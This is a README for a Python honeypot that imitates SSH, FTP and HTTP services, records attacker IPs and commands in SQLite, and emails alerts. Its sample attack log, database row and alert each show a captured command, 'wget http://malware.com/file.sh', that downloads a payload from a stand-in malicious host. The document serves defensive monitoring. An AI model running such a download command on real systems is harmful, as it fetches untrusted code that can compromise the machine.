Honeypot System with Real-Time Alerts

A cybersecurity project that deploys a honeypot server to attract attackers by simulating vulnerable services (SSH, FTP, HTTP). The system logs malicious activities (IP, ports, commands) into a database and sends real-time email alerts when attacks are detected. Useful for analyzing hacker behavior and improving security awareness.

Features

Simulates SSH (22), FTP (21), HTTP (80) services to lure attackers

Logs attacker activities (IP, port, command, timestamp)

Stores logs in SQLite database (honeypot.db)

Sends real-time email alerts for new attack attempts

Supports multi-threaded connections

Extendable for dashboards and threat analysis

Tech Stack

Language: Python

Libraries: socket, sqlite3, logging, smtplib, email.mime, threading, datetime

Database: SQLite (default) / MySQL

Optional Enhancements: Flask/Django (for dashboards), Scapy (for packet capture)

Environment: Linux (Ubuntu Server / VM recommended)

Project Structure
honeypot/
│── honeypot.py # Main honeypot server (multi-port)
│── database.py # Database setup and logging
│── alert.py # Email alert function
│── honeypot.db # SQLite database (auto-created)
│── honeypot.log # Log file (auto-created)
│── requirements.txt # Dependencies
│── README.txt # Documentation

Setup & Installation

Clone the repository:
git clone https://github.com/yourusername/honeypot.git

cd honeypot

Install dependencies:
pip install -r requirements.txt

Configure email settings in alert.py:
EMAIL_SENDER = "your_email@gmail.com
"
EMAIL_PASSWORD = "your_app_password"
EMAIL_RECEIVER = "alert_receiver@gmail.com
"

(For Gmail, generate an App Password instead of using your real password.)

Run the honeypot:
python honeypot.py

Example Attack Log
[2025-09-15 10:12:45] Connection from 185.23.45.10:22 -> wget http://malware.com/file.sh

Database Entry:
ID | IP Address | Port | Command | Timestamp
1 | 185.23.45.10 | 22 | wget http://malware.com/file.sh
 | 2025-09-15 10:12:45

Email Alert:
🚨 Honeypot Alert: New Attack Detected
IP Address: 185.23.45.10
Port: 22
Command: wget http://malware.com/file.sh

Time: 2025-09-15 10:12:45